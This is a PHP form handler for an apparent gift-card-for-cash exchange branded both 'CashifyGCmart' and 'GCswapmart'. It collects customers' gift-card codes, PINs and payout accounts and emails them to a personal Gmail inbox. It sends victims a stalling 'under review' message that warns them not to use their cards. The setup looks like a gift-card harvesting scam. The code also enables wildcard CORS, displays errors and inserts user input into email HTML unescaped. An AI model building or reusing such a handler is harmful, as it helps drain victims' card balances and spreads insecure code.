<?php
// Error reporting for development (disable in production)
error_reporting(E_ALL);
ini_set('display_errors', 1);

// CORS headers
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type");
header("Content-Type: application/json");

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Only allow POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'message' => 'Method not allowed']);
    exit();
}

// Email Configuration - Updated to use standard PHP mail()
$operations_email = 'marketingmanager3059@gmail.com';
$from_email = 'noreply@cashifygcmart.com';
$from_name = 'CashifyGCmart';

// Get JSON input
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if (!$data) {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'Invalid JSON data']);
    exit();
}

// Validate required fields
$required_fields = ['firstName', 'lastName', 'email', 'phoneNumber', 'cards', 'paymentMethod'];
foreach ($required_fields as $field) {
    if (!isset($data[$field]) || empty($data[$field])) {
        http_response_code(400);
        echo json_encode(['success' => false, 'message' => "Missing required field: $field"]);
        exit();
    }
}

// Generate reference number
function generate_reference_number() {
    $timestamp = date('His');
    $random_num = rand(10, 99);
    return "GC-{$timestamp}-{$random_num}";
}

// Email template functions
function generate_confirmation_email_html($customer_name, $reference_number) {
    return "
<!DOCTYPE html>
<html lang=\"en\">
<head>
    <meta charset=\"UTF-8\">
    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
    <title>Gift Card Submission Confirmation</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333333;
            background-color: #f5f7fa;
            padding: 20px 0;
        }
        .email-container {
            max-width: 650px;
            margin: 0 auto;
            background-color: #ffffff;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        }
        .header {
            background: linear-gradient(135deg, #ec4899 0%, #8b5cf6 100%);
            color: white;
            padding: 35px 30px;
            text-align: center;
        }
        .logo {
            font-size: 26px;
            font-weight: 800;
            margin-bottom: 8px;
        }
        .tagline {
            font-size: 12px;
            opacity: 0.9;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 20px;
        }
        .content {
            padding: 35px 30px;
        }
        .reference {
            font-size: 18px;
            font-weight: 600;
            color: #0c4a6e;
            margin-bottom: 25px;
        }
        .section {
            margin-bottom: 25px;
        }
        .section-title {
            font-size: 16px;
            font-weight: 600;
            color: #1f2937;
            margin-bottom: 10px;
        }
        .section-content {
            font-size: 14px;
            color: #4b5563;
            line-height: 1.6;
        }
        .guidelines {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
        }
        .guidelines ul {
            margin: 10px 0;
            padding-left: 20px;
        }
        .guidelines li {
            margin-bottom: 8px;
        }
        .contact-info {
            background: #e8f5e8;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
            text-align: left;
        }
    </style>
</head>
<body>
    <div class=\"email-container\">
        <div class=\"header\">
            <div class=\"logo\">GCswapmart</div>
            <div class=\"tagline\">Instant Offers, Same-Day Payments</div>
        </div>
        <div class=\"content\">
            <div class=\"reference\">Reference Number: {$reference_number}</div>
            
            <p style=\"margin-bottom: 20px;\">Thank you for submitting your gift card details to GCswapmart. Below is an update on the current status of your submission.</p>
            
            <div class=\"section\">
                <div class=\"section-title\">📋 Current Status</div>
                <div class=\"section-content\">
                    Our team is currently reviewing the gift card details you provided. This process ensures all submissions meet our standards for accuracy and authenticity. Your cooperation helps us maintain the trust and quality our customers rely on.
                </div>
            </div>
            
            <div class=\"section\">
                <div class=\"section-title\">📌 Next Steps</div>
                <div class=\"section-content\">
                    <strong>Notification Timeline:</strong> You will receive an update within 14 hours. Please check your inbox and spam/junk folders.<br><br>
                    <strong>If Approved:</strong> We'll provide redemption details and timelines in the follow-up email.<br><br>
                    <strong>If Not Approved:</strong> If no response is received within 8 hours, it may indicate your submission wasn't approved. Contact us for clarification.<br><br>
                    <strong>Important:</strong> Do not use your gift card during the review period to avoid processing issues.
                </div>
            </div>
            
            <div class=\"guidelines\">
                <div class=\"section-title\">📝 Gift Card Submission Guidelines</div>
                <ul>
                    <li><strong>Eligible Cards:</strong> Only those listed in our Rate Calculator.</li>
                    <li><strong>Minimum Value:</strong> $50 per card.</li>
                    <li><strong>Processing Times:</strong> Vary based on demand and market conditions.</li>
                    <li><strong>Sundays:</strong> Submissions are processed on the next business day.</li>
                    <li><strong>After 8 PM EST:</strong> Processed the following day.</li>
                    <li><strong>Payment Methods:</strong> May be updated based on transaction success.</li>
                    <li><strong>Unlisted Cards:</strong> Contact support before submission.</li>
                    <li><strong>Disclaimer:</strong> GCswapmart is not responsible for balance discrepancies on unlisted cards.</li>
                </ul>
            </div>
            
            <p style=\"margin-bottom: 20px;\">Thank you again for choosing GCswapmart. Our support team is always here to help.</p>
            
            <div class=\"contact-info\">
                <p><strong>Best regards,</strong></p>
                <p><strong>Robert Smith</strong><br>
                Customer Support Manager<br>
                📧 support@cashifygcmart.com<br>
                🌐 www.cashifygcmart.com</p>
            </div>
        </div>
    </div>
</body>
</html>";
}

function generate_internal_notification_email($customer_name, $reference_number, $submission_data) {
    $cards_info = "";
    $total_value = 0;
    
    foreach ($submission_data['cards'] as $index => $card) {
        $card_value = floatval($card['value'] ?? 0);
        $total_value += $card_value;
        
        $cards_info .= "Card " . ($index + 1) . ": " . ($card['brand'] ?? 'N/A') . 
                      " - Value: $" . ($card['value'] ?? '0') . 
                      " - Condition: " . ucwords(str_replace('-', ' ', $card['condition'] ?? 'N/A')) . 
                      " - Receipt: " . (($card['hasReceipt'] ?? 'no') === 'yes' ? 'Yes' : 'No') . 
                      " - Type: " . ucwords($card['cardType'] ?? 'N/A') . "\n";
        
        if (($card['cardType'] ?? '') === 'digital') {
            $cards_info .= "Digital Code: " . ($card['digitalCode'] ?? 'N/A') . "\n";
            $cards_info .= "Digital PIN: " . ($card['digitalPin'] ?? 'Not provided') . "\n";
        }
    }
    
    $payment_method = strtoupper($submission_data['paymentMethod'] ?? '');
    $payment_details = "";
    switch ($payment_method) {
        case 'PAYPAL':
            $payment_details = "PayPal: " . ($submission_data['paypalAddress'] ?? 'Not provided');
            break;
        case 'ZELLE':
            $payment_details = "Zelle: " . ($submission_data['zelleDetails'] ?? 'Not provided');
            break;
        case 'CASHAPP':
            $payment_details = "Cash App: " . ($submission_data['cashAppTag'] ?? 'Not provided');
            break;
        case 'BTC':
            $payment_details = "Bitcoin: " . ($submission_data['btcAddress'] ?? 'Not provided');
            break;
        case 'CHIME':
            $payment_details = "Chime: " . ($submission_data['chimeDetails'] ?? 'Not provided');
            break;
    }
    
    return "
<!DOCTYPE html>
<html>
<head>
    <meta charset=\"UTF-8\">
    <title>New GCswapmart Submission - {$reference_number}</title>
</head>
<body style=\"font-family: Arial, sans-serif; padding: 20px; background-color: #f5f5f5;\">
    <div style=\"max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px;\">
        <h2 style=\"color: #1f2937; margin-top: 0;\">New GCswapmart Submission</h2>
        
        <div style=\"background: #e5e7eb; padding: 15px; border-radius: 5px; margin: 20px 0;\">
            <strong>Reference Number:</strong> {$reference_number}
        </div>
        
        <h3 style=\"color: #374151; border-bottom: 2px solid #e5e7eb; padding-bottom: 5px;\">Customer Information</h3>
        <p><strong>Name:</strong> {$customer_name}</p>
        <p><strong>Email:</strong> " . ($submission_data['email'] ?? 'N/A') . "</p>
        <p><strong>Phone:</strong> " . ($submission_data['phoneNumber'] ?? 'N/A') . "</p>
        <p><strong>Payment Method:</strong> {$payment_details}</p>
        
        <h3 style=\"color: #374151; border-bottom: 2px solid #e5e7eb; padding-bottom: 5px;\">Gift Card Details</h3>
        <div style=\"background: #f9fafb; padding: 15px; border-radius: 5px; white-space: pre-line;\">
{$cards_info}
        </div>
        
        <div style=\"background: #fef3c7; border: 1px solid #f59e0b; padding: 15px; margin: 20px 0; border-radius: 5px;\">
            <strong>Total Value:</strong> $" . number_format($total_value, 2) . "
        </div>
        
        <p style=\"font-size: 12px; color: #6b7280;\">
            Submission Date: " . date('Y-m-d H:i:s') . "<br>
            System: GCswapmart Internal Notification
        </p>
    </div>
</body>
</html>";
}

// Send email function - Simplified for better compatibility
function send_email($to, $subject, $html_body, $from_email, $from_name) {
    // Email headers for HTML email
    $headers = array();
    $headers[] = 'MIME-Version: 1.0';
    $headers[] = 'Content-type: text/html; charset=UTF-8';
    $headers[] = "From: {$from_name} <{$from_email}>";
    $headers[] = "Reply-To: {$from_email}";
    $headers[] = "X-Mailer: PHP/" . phpversion();
    
    // Convert headers array to string
    $header_string = implode("\r\n", $headers);
    
    // Send email using PHP's built-in mail() function
    $success = mail($to, $subject, $html_body, $header_string);
    
    return $success;
}

// Process the submission
try {
    $reference_number = generate_reference_number();
    $customer_name = trim($data['firstName']) . ' ' . trim($data['lastName']);
    
    // Send confirmation email to customer
    $customer_email_sent = false;
    $customer_subject = "GCswapmart Submission Status Update - Reference #{$reference_number}";
    $customer_html = generate_confirmation_email_html($customer_name, $reference_number);
    
    try {
        $customer_email_sent = send_email(
            $data['email'], 
            $customer_subject, 
            $customer_html, 
            $from_email, 
            $from_name
        );
    } catch (Exception $e) {
        error_log("Customer email failed: " . $e->getMessage());
    }
    
    // Send internal notification
    $internal_email_sent = false;
    $internal_subject = "NEW GCswapmart Submission - Reference {$reference_number} - {$customer_name}";
    $internal_html = generate_internal_notification_email($customer_name, $reference_number, $data);
    
    try {
        $internal_email_sent = send_email(
            $operations_email, 
            $internal_subject, 
            $internal_html, 
            $from_email, 
            $from_name
        );
    } catch (Exception $e) {
        error_log("Internal email failed: " . $e->getMessage());
    }
    
    // Return success response
    http_response_code(200);
    echo json_encode([
        'success' => true,
        'reference_number' => $reference_number,
        'message' => 'Gift card submission received successfully',
        'customer_email_sent' => $customer_email_sent,
        'internal_email_sent' => $internal_email_sent
    ]);
    
} catch (Exception $e) {
    error_log("Submission processing failed: " . $e->getMessage());
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'message' => 'Submission failed: ' . $e->getMessage()
    ]);
}
?>